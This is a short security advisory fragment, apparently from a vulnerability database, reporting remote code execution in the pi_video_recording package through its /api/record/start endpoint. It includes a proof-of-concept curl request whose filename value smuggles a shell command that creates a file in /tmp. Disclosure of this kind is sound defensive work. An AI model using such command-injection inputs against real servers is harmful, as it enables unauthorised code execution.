  "summary": "Remote Code Execution in pi_video_recording",
  "details": "All versions of `pi_video_recording` are vulnerable to Remote Code Execution. Due to insufficient input validation the server executes arbitrary code through the /api/record/start endpoint.  After running the server, `curl -POST -H \"Content-Type: application/json\" -d '{\"filename\": \" || touch /tmp/worked;\"}' http://localhost:5000/api/record/start`creates a file in the /tmp/ directory\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
